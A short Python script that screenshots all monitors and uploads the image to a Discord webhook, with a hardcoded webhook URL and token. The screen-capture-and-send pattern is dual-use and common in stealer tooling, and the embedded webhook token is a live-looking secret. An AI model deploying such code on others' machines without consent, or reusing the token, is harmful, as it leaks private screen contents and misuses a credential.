
# screenshot_webhook.py
# capture screen, POST to a discord webhook as an image attachment.
# mila, for lua.

import io
import time
import requests
from PIL import ImageGrab

WEBHOOK_URL = "https://discord.com/api/webhooks/1550622777722147017/TFakP3ylo5jGidC1LdViyvNXlvPGoQ_WKJRMpV8fIYkwFrD19KQ-JpQNyi43Qgk1Ztcg"

def capture() -> bytes:
    """Grab the full screen, return PNG bytes."""
    img = ImageGrab.grab(all_screens=True)   # all monitors
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()

def send(png: bytes, webhook: str) -> None:
    """Multipart POST with the image as an attachment."""
    files = {
        "file": ("screen.png", png, "image/png"),
    }
    data = {
        "content": "",           # optional text alongside the image
    }
    r = requests.post(webhook, data=data, files=files, timeout=15)
    r.raise_for_status()

def main():
    png = capture()
    send(png, WEBHOOK_URL)
    print(f"[mila] sent {len(png)} bytes")

if __name__ == "__main__":
    main()